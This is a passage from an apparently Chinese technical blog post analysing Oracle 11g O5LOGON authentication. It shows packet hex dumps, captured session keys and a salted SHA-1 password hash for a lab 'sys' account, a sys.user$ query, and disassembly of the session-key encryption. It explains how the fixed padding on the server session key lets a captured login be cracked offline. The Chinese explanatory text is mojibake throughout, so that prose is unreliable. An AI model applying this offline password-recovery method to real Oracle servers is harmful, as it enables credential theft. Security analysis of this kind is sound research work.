class="hljs-number">00</span>  TNS V1-V3)....$.<br><span class="hljs-attribute">0190</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">4</span>d <span class="hljs-number">41</span> <span class="hljs-number">43</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>e <span class="hljs-number">45</span> <span class="hljs-number">15</span>  ...AUTH_MACHINE.<br><span class="hljs-attribute">01a0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">07</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>e <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">18</span>  ....henices.....<br><span class="hljs-attribute">01b0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">50</span> <span class="hljs-number">49</span> <span class="hljs-number">44</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ....AUTH_PID....<br><span class="hljs-attribute">01c0</span>   <span class="hljs-number">04</span> <span class="hljs-number">36</span> <span class="hljs-number">32</span> <span class="hljs-number">32</span> <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span>  .<span class="hljs-number">6228</span>.........AU<br><span class="hljs-attribute">01d0</span>   <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">53</span> <span class="hljs-number">49</span> <span class="hljs-number">44</span> <span class="hljs-number">15</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">07</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>e <span class="hljs-number">69</span> <span class="hljs-number">63</span>  TH_SID.....henic<br><span class="hljs-attribute">01e0</span>   <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f  es.........AUTH_<br><span class="hljs-attribute">01f0</span>   <span class="hljs-number">41</span> <span class="hljs-number">43</span> <span class="hljs-number">4</span>c <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">34</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ACL.....<span class="hljs-number">4400</span>....<br><span class="hljs-attribute">0200</span>   <span class="hljs-number">36</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">12</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">41</span> <span class="hljs-number">4</span>c <span class="hljs-number">54</span> <span class="hljs-number">45</span> <span class="hljs-number">52</span> <span class="hljs-number">5</span>f  <span class="hljs-number">6</span>....AUTH_ALTER_<br><span class="hljs-attribute">0210</span>   <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>f <span class="hljs-number">4</span>e <span class="hljs-number">6</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">25</span> <span class="hljs-number">41</span> <span class="hljs-number">4</span>c <span class="hljs-number">54</span> <span class="hljs-number">45</span>  SESSIONo...%ALTE<br><span class="hljs-attribute">0220</span>   <span class="hljs-number">52</span> <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>f <span class="hljs-number">4</span>e <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">54</span> <span class="hljs-number">20</span> <span class="hljs-number">54</span> <span class="hljs-number">49</span>  R SESSION SET TI<br><span class="hljs-attribute">0230</span>   <span class="hljs-number">4</span>d <span class="hljs-number">45</span> <span class="hljs-number">5</span>f <span class="hljs-number">5</span>a <span class="hljs-number">4</span>f <span class="hljs-number">4</span>e <span class="hljs-number">45</span> <span class="hljs-number">3</span>d <span class="hljs-number">27</span> <span class="hljs-number">2</span>b <span class="hljs-number">30</span> <span class="hljs-number">38</span> <span class="hljs-number">3</span>a <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">27</span>  ME_ZONE=&#x27;+<span class="hljs-number">08</span>:<span class="hljs-number">00</span>&#x27;<br><span class="hljs-attribute">0240</span>   <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">45</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">17</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">4</span>c  .....E....AUTH_L<br><span class="hljs-attribute">0250</span>   <span class="hljs-number">4</span>f <span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">4</span>c <span class="hljs-number">5</span>f <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>f <span class="hljs-number">4</span>e <span class="hljs-number">5</span>f <span class="hljs-number">49</span>  OGICAL_SESSION_I<br><span class="hljs-attribute">0260</span>   <span class="hljs-number">44</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">33</span> <span class="hljs-number">41</span> <span class="hljs-number">43</span> <span class="hljs-number">30</span> <span class="hljs-number">41</span>  D`... CAA893AC0A<br><span class="hljs-attribute">0270</span>   <span class="hljs-number">34</span> <span class="hljs-number">33</span> <span class="hljs-number">30</span> <span class="hljs-number">46</span> <span class="hljs-number">41</span> <span class="hljs-number">30</span> <span class="hljs-number">45</span> <span class="hljs-number">30</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">37</span> <span class="hljs-number">46</span> <span class="hljs-number">30</span> <span class="hljs-number">31</span>  <span class="hljs-number">430</span>FA0E040007F01<br><span class="hljs-attribute">0280</span>   <span class="hljs-number">30</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">38</span> <span class="hljs-number">35</span> <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">41</span>  <span class="hljs-number">011854</span>....<span class="hljs-number">0</span>....A<br><span class="hljs-attribute">0290</span>   <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">46</span> <span class="hljs-number">41</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>c <span class="hljs-number">4</span>f <span class="hljs-number">56</span> <span class="hljs-number">45</span> <span class="hljs-number">52</span> <span class="hljs-number">5</span>f <span class="hljs-number">49</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span>  UTH_FAILOVER_ID.<br><span class="hljs-attribute">02a0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                             .......<br></code></pre></td></tr></table></figure><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">AUTH_SESSKEY_SRV</span><span class="hljs-punctuation">:</span> <span class="hljs-string">52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span><br><span class="hljs-attribute">AUTH_SESSKEY_CLI</span><span class="hljs-punctuation">:</span> <span class="hljs-string">FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span><br><span class="hljs-attribute">AUTH_PASSWORD</span><span class="hljs-punctuation">   :</span> <span class="hljs-string">2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span><br><span class="hljs-attribute">AUTH_VFR_DATA</span><span class="hljs-punctuation">   :</span> <span class="hljs-string">43E0BE20B32B0BB76E57</span><br></code></pre></td></tr></table></figure><h2 id="Oracle-O5LOGON-åè®®ä»‹ç»"><a href="#Oracle-O5LOGON-åè®®ä»‹ç»" class="headerlink" title="Oracle O5LOGON åè®®ä»‹ç»"></a>Oracle O5LOGON åè®®ä»‹ç»</h2><p>Oracle 11g password hash ç®—æ³•ä¸º, ç”¨æˆ·å sys, å¯†ç  nsfocus</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-meta">&gt;&gt;&gt; </span>hashlib.sha1(<span class="hljs-string">&#x27;nsfocus&#x27;</span> + <span class="hljs-string">&#x27;\x43\xE0\xBE\x20\xB3\x2B\x0B\xB7\x6E\x57&#x27;</span>).hexdigest()<br><span class="hljs-string">&#x27;c3d98762d258d4bd92c572065ddea9af38123f88&#x27;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨Oracleæ•°æ®ä¸­æŸ¥è¯¢:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> name, password, spare4 <span class="hljs-keyword">from</span> sys.user$ <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SYS&#x27;</span>;<br><br>NAME                   PASSWORD<br><span class="hljs-comment">------------------------------ ------------------------------</span><br>SPARE4<br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br>SYS                <span class="hljs-number">0</span>F2417000362F55F<br>S:C3D98762D258D4BD92C572065DDEA9AF38123F8843E0BE20B32B0BB76E57<br><br>password hashï¼š C3D98762D258D4BD92C572065DDEA9AF38123F88<br>salt         ï¼š <span class="hljs-number">43E0</span>BE20B32B0BB76E57<br></code></pre></td></tr></table></figure><ol><li>client å‘é€ç”¨æˆ·åç»™server<br>2  server åˆ¤æ–­æ˜¯å¦æ˜¯å¯ç”¨çš„ç”¨æˆ·åï¼Œå¦‚æœç”¨æˆ·åå¯ç”¨ï¼Œè¿›å…¥ä¸‹ä¸€æ­¥ã€‚</li><li>Server åŠ å¯†AUTH_SESSKEY,  å–å‡º salt</li></ol><p>ä½¿ç”¨AES192 CBC åŠ å¯†AUTH_SESSKEY, keyä¸ºoralceæ•°æ®åº“ä¸­çš„20å­—èŠ‚çš„password hashå’Œ4ä¸ª<br>é›¶(192bit)ã€‚</p><ol start="4"><li><p>Server å°†åŠ å¯†çš„AUTH_SESSKEYå’ŒAUTH_VFR_DATA å‘é€ç»™Client<br>AUTH_VFR_DATA ä¸ºsalt</p></li><li><p>Clientè®¡ç®—password hash (é€šè¿‡ç”¨æˆ·è¾“å…¥çš„å¯†ç ), ä½¿ç”¨Clientè®¡ç®—çš„password hash<br>(åŠ ä¸Š4ä¸ªé›¶)ä¸ºkey ä½¿ç”¨AES192 CBCç®—æ³•åŠ å¯†Client AUTH_SESSKEY</p></li><li><p>Client è®¡ç®— Combine_SessKey<br>å°†è§£å¯†çš„Server AUTH_SESSKEY å’Œ Client AUTH_SESSKEYçš„ç¬¬17ä¸ªå­—èŠ‚å¼€å§‹çš„24ä¸ªå­—èŠ‚åšå¼‚<br>æˆ–ï¼Œå°†å¼‚æˆ–ç»“æœçš„å‰16å­—èŠ‚åšMD5, å8å­—èŠ‚åšMD5, å¾—åˆ°Combine_SessKey</p></li><li><p>Client ä½¿ç”¨ Combine_SessKey åŠ å¯†ç”¨æˆ·è¾“å…¥çš„å¯†ç æ˜æ–‡ï¼Œå¾—åˆ° AUTH_PASSWORD<br>ä½¿ç”¨ç®—æ³•ä¸ºAES192 CBC</p></li><li><p>Client å°†åŠ å¯†çš„Client AUTH_SESSKEYå’ŒåŠ å¯†çš„AUTH_PASSWORD å‘é€ç»™ Server</p></li><li><p>Server ä½¿ç”¨æ•°æ®åº“ä¸­çš„ password hash è§£å¯† Client AUTH_SESSKEY</p></li><li><p>Server å°è¯•è§£å¯†AUTH_PASSWORD è§£å¯†æˆåŠŸåˆ™è®¤è¯é€šè¿‡</p></li></ol><p>å‚çœ‹:<br><a href="http://www.oxid.it/downloads/oracle_tns_aes192_check.txt">http://www.oxid.it/downloads/oracle_tns_aes192_check.txt</a></p><p>è¿™ä¸ªæ¼æ´æ˜¯ç”Ÿæˆserver sesskey æ—¶ï¼Œåœ¨æœ«å°¾æ·»åŠ äº†8ä¸ª0x08, å› ä¸ºsaltå·²çŸ¥ï¼ˆç”±æœåŠ¡å™¨è¿”å›<br>ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€å°è¯•è®¡ç®—SHA-1çš„password hashï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªpassword hash å»è§£å¯†<br>server sesskeyï¼Œ åªè¦æœ«å°¾æ˜¯8ä¸ª0x08 åˆ™è¯´æ˜è¿™æ˜¯æ­£ç¡®çš„server sesskeyï¼Œæ­¤æ—¶ä½¿ç”¨çš„å¯†<br>ç ä¸ºæ­£ç¡®çš„å¯†ç ï¼ŒåŸå› æ˜¯</p><p>AES 192 åŠ å¯†å—é•¿åº¦ä¸º128 bit (16 byte), åˆ†ç»„åŠ å¯†å¦‚æœæ˜æ–‡å†…å®¹ä¸æ˜¯å—é•¿åº¦çš„æ•´æ•°å€æ—¶<br>éœ€è¦å¡«å……ã€‚å¡«å……éƒ¨åˆ†çš„å†…å®¹ä¸ºå·®çš„å­—èŠ‚æ•°ï¼Œæ¯”å¦‚11å­—èŠ‚çš„æ˜æ–‡ï¼Œéœ€è¦åœ¨æœ«å°¾å¡«å……5ä¸ª0x5</p><p>ä»æ±‡ç¼–ä»£ç é‡Œåˆ†æserver session key çš„ç”Ÿæˆè¿‡ç¨‹ï¼Œåˆ†æçš„ç¨‹åºä¸º Oracle.exe 11.2.0.1.0<br>oracle.exeè°ƒç”¨ oran11.ztvo5ke åŠ å¯†session key</p><p>oran11.ztvo5ke -&gt; oracrypt11.ztceenc  -&gt; orancrypt11.ztcen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">e_key</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> s[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[<span class="hljs-number">100</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sess_key</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> type;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[<span class="hljs-number">40</span>];<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pwd_hash</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> unknown1;<br>    <span class="hljs-type">uint32_t</span> hash_len;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> hash[<span class="hljs-number">20</span>];<br>&#125;<br><br>ztvo5ke ( e_key*, sess_key*, pwd_hash*, <span class="hljs-type">int</span>);<br></code></pre></td></tr></table></figure><p>sess_key.type &#x3D;&#x3D; 0x1492 ( AES 192 )</p><p>plaintext    24  + 16 &#x3D; 40 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:101BC481                 push    eax        ; unknown structure<br>.text:101BC482                 push    edx        ; encrypted session key<br>.text:101BC483                 push    28h        ; length<br>.text:101BC485                 push    ecx        ; plaintext session key<br>.text:101BC486                 push    0<br>.text:101BC488                 push    ebx        ; 0x18<br>.text:101BC489                 push    87004001h<br>.text:101BC48E                 call    ztceenc    ; AES 192<br>.text:101BC493                 add     esp, 1Ch<br>.text:101BC496                 mov     ebx, eax<br>.text:101BC498                 test    ebx, ebx<br>.text:101BC49A                 jnz     short loc_101BC4B8<br>.text:101BC49C                 lea     edx, [ebp+var_A4]<br>.text:101BC4A2                 lea     eax, [edi+2]<br>.text:101BC4A5                 push    eax       ; e_key+2<br>.text:101BC4A6                 push    [ebp+var_C8]<br>.text:101BC4AC                 push    edx       ; encryted session key<br>.text:101BC4AD                 call    ztucbtx<br></code></pre></td></tr></table></figure><p>ztceenc  è¿è¡Œå‰åçš„æƒ…å†µ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0DC3A4E4</span>                                      <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                       <br><span class="hljs-attribute">0DC3A4F4</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A504</span>  <span class="hljs-number">0</span>C <span class="hljs-number">4</span>A FE <span class="hljs-number">0</span>C <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> FF FF FF FF <span class="hljs-number">13</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A514</span>  <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                     <br><span class="hljs-attribute">0DC3A524</span>  <span class="hljs-number">44</span> <span class="hljs-number">94</span> <span class="hljs-number">3</span>E <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A534</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A544</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A554</span>  <span class="hljs-number">7</span>A EF <span class="hljs-number">5</span>B <span class="hljs-number">9</span>E <span class="hljs-number">89</span> D3 <span class="hljs-number">9</span>F <span class="hljs-number">07</span> <span class="hljs-number">62</span> A8 <span class="hljs-number">83</span> BB C6 <span class="hljs-number">4</span>D <span class="hljs-number">9</span>F D9..                        <br><span class="hljs-attribute">0DC3A564</span>  EA <span class="hljs-number">7</span>B <span class="hljs-number">90</span> <span class="hljs-number">1</span>C <span class="hljs-number">49</span> <span class="hljs-number">9</span>B <span class="hljs-number">73</span> <span class="hljs-number">36</span> BE <span class="hljs-number">60</span> AF F6 <span class="hljs-number">69</span> A4 ED <span class="hljs-number">37</span>..                        <br><span class="hljs-attribute">0DC3A574</span>  <span class="hljs-number">8</span>D <span class="hljs-number">1</span>D B3 B7 <span class="hljs-number">60</span> <span class="hljs-number">30</span> C7 <span class="hljs-number">56</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">8</span>C A5 C3 <span class="hljs-number">0</span>D..                        <br><span class="hljs-attribute">0DC3A584</span>  C8 B3 <span class="hljs-number">13</span> <span class="hljs-number">21</span> <span class="hljs-number">77</span> BF F6 <span class="hljs-number">84</span> <span class="hljs-number">28</span> <span class="hljs-number">3</span>A D6 <span class="hljs-number">54</span> <span class="hljs-number">9</span>F <span class="hljs-number">65</span> <span class="hljs-number">96</span> <span class="hljs-number">0</span>B..                        <br><span class="hljs-attribute">0DC3A594</span>  <span class="hljs-number">0</span>E <span class="hljs-number">0</span>A E4 <span class="hljs-number">60</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A5A4</span>  <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">84</span> A5 C3 <span class="hljs-number">0</span>D E0 <span class="hljs-number">3</span>E FE <span class="hljs-number">0</span>C A8 <span class="hljs-number">46</span> A7 <span class="hljs-number">0</span>C..                     <br><span class="hljs-attribute">0DC3A5B4</span>  <span class="hljs-number">94</span> <span class="hljs-number">77</span> FE <span class="hljs-number">0</span>C <span class="hljs-number">0</span>C C6 C3 <span class="hljs-number">0</span>D <span class="hljs-number">4</span>A EA <span class="hljs-number">50</span> <span class="hljs-number">01</span> F4 C4 C3 <span class="hljs-number">0</span>D..                        <br><span class="hljs-attribute">0DC3A5C4</span>  F8 <span class="hljs-number">49</span> FE <span class="hljs-number">0</span>C <span class="hljs-number">10</span> FB EC <span class="hljs-number">0</span>D..........................                     <br>                                                                                <br>                                                                                <br><span class="hljs-attribute">eax</span> = <span class="hljs-number">0</span>DC3A4F0                                                                  <br><span class="hljs-attribute">edx</span> = <span class="hljs-number">0</span>DC3A514                                                                  <br><span class="hljs-attribute">ecx</span> = <span class="hljs-number">0</span>DC3A554                                                                  <br><span class="hljs-attribute">ebx</span> = <span class="hljs-number">0</span>DC3A5A4                                                                  <br>                                                                                <br>                                                                                <br><span class="hljs-attribute">0DC3A4E4</span>                                      <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                     <br><span class="hljs-attribute">0DC3A4F4</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A504</span>  <span class="hljs-number">0</span>C <span class="hljs-number">4</span>A FE <span class="hljs-number">0</span>C <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> FF FF FF FF <span class="hljs-number">13</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A514</span>  <span class="hljs-number">61</span> <span class="hljs-number">15</span> <span class="hljs-number">91</span> <span class="hljs-number">7</span>F D6 AE B9 <span class="hljs-number">29</span> <span class="hljs-number">00</span> <span class="hljs-number">07</span> A4 <span class="hljs-number">02</span> A6 B1 <span class="hljs-number">2</span>B AA..                        <br><span class="hljs-attribute">0DC3A524</span>  BD <span class="hljs-number">3</span>B AA <span class="hljs-number">0</span>C <span class="hljs-number">13</span> C0 E5 <span class="hljs-number">18</span> <span class="hljs-number">8</span>E FE BA AC F5 <span class="hljs-number">4</span>C <span class="hljs-number">01</span> BE.                      <br><span class="hljs-attribute">0DC3A534</span>  <span class="hljs-number">96</span> <span class="hljs-number">8</span>F <span class="hljs-number">59</span> <span class="hljs-number">0</span>D B9 <span class="hljs-number">9</span>E <span class="hljs-number">2</span>C F6 <span class="hljs-number">98</span> <span class="hljs-number">74</span> <span class="hljs-number">1</span>F EF <span class="hljs-number">22</span> CE <span class="hljs-number">17</span> <span class="hljs-number">47</span>..                        <br><span class="hljs-attribute">0DC3A544</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span 